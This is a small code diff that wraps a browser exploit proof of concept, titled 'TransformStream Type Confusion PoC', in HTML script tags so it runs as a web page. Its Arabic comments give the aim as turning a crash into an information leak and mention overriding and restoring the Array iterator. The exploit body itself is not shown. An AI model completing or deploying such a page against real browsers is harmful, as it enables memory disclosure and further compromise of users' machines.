@@ -1,4 +1,5 @@
-// ========== TransformStream Type Confusion PoC ==========
+<html>
+<script> // ========== TransformStream Type Confusion PoC ==========
 // الهدف: تحويل الـ crash إلى info leak
 
 // حفظ الـ iterator الأصلي
@@ -154,4 +155,6 @@ try {
 }
 
 // استعادة الـ iterator
-Array.prototype[Symbol.iterator] = origIter;
+Array.prototype[Symbol.iterator] = origIter; 
+</script>
+</html>
